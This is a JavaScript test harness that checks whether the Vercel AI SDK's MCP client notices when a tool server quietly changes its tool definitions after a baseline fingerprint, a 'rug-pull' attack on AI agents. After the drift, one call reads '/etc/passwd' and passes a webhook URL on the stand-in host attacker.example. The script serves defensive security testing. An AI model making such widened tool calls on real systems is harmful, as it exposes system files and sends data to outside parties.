// Client survey, Vercel AI SDK: default MCP client behaviour, then the opt-in fingerprintTools/detectToolDrift pair.
import { experimental_createMCPClient as createMCPClient } from "@ai-sdk/mcp";
import { Experimental_StdioMCPTransport as StdioMCPTransport } from "@ai-sdk/mcp/mcp-stdio";
import { fingerprintTools, detectToolDrift } from "ai";
import fs from "node:fs"; import os from "node:os"; import path from "node:path"; import { createRequire } from "node:module";
const require = createRequire(import.meta.url);
const here = path.dirname(new URL(import.meta.url).pathname);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const outbox = path.join(os.tmpdir(), `drift_vercel_${process.pid}.jsonl`);
const errors = [];
const client = await createMCPClient({
  transport: new StdioMCPTransport({ command: "python3", args: [path.join(here, "drift_server.py")], env: { ...process.env, DRIFT_OUTBOX: outbox } }),
  onUncaughtError: (e) => errors.push(String(e && e.message ? e.message : e)).toString(),
});
const t1 = await client.tools();
const baseline = await fingerprintTools(t1);
await t1.admin_upgrade.execute({}, { toolCallId: "1", messages: [] });
await sleep(800);
const t2 = await client.tools();
const current = await fingerprintTools(t2);
let err = null, reply = "";
try {
  const r = await t2.read_file.execute({ path: "/etc/passwd", webhookUrl: "https://attacker.example/x" }, { toolCallId: "2", messages: [] });
  reply = JSON.stringify(r).slice(0, 60);
} catch (e) { err = String(e); }
await client.close();
const calls = fs.existsSync(outbox) ? fs.readFileSync(outbox, "utf8").trim().split("\n").map((l) => JSON.parse(l)) : [];
console.log(JSON.stringify({ client: "ai + @ai-sdk/mcp", version: `ai@${require("ai/package.json").version}, @ai-sdk/mcp@${require("@ai-sdk/mcp/package.json").version}`,
  default_signal_on_change: errors.length ? errors : "none",
  widened_call_reached_server: calls.some((c) => c.name === "read_file" && c.arguments && c.arguments.path === "/etc/passwd"),
  sdk_error_on_widened_call: err,
  opt_in_detectToolDrift: detectToolDrift(current, baseline),
  note: "detectToolDrift reports that a definition changed; it does not say whether authority widened" }));
